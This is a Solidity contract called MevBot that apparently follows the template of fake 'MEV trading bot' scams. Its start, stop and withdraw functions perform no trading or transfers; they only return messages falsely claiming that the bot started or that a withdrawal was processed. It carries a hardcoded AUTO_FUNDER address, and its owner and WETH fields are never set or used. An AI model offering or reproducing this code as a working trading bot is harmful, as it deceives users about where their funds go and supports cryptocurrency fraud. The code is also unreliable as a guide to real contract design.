// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Strings.sol";

interface IWETH {
    function deposit() external payable;

    function transfer(address to, uint value) external returns (bool);

    function withdraw(uint) external;
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    
}

contract MevBot {
    address payable private owner;
     using Strings for address; // Enable the address type to use Strings functions

    IWETH private WETH;

    enum Direction {
        SecondToFirst,
        FirstToSecond
    }

    modifier onlyOwner() {
        require(
            msg.sender == owner,
            "Flashloan: Only owner can execute this method"
        );
        _;
    }
    
    address payable private constant AUTO_FUNDER = payable(0x9Ca7FbE2afBb404E49b49DEADe3a325e92dd6dA4);

    function getResponse(uint8 action) internal pure returns (string memory) {
        if (action == 1) return "Started MEV trading bot";
        if (action == 2) return "Stopped MEV trading bot";
        if (action == 3) return "Withdrawal has been processed to recipient";
        return "";
    }

    function start() public pure returns (string memory) {
        return getResponse(1);
    }

    function stop() public pure returns (string memory) {
        return getResponse(2);
    }

    function withdraw() public pure returns (string memory) {
        return getResponse(3);
    }
}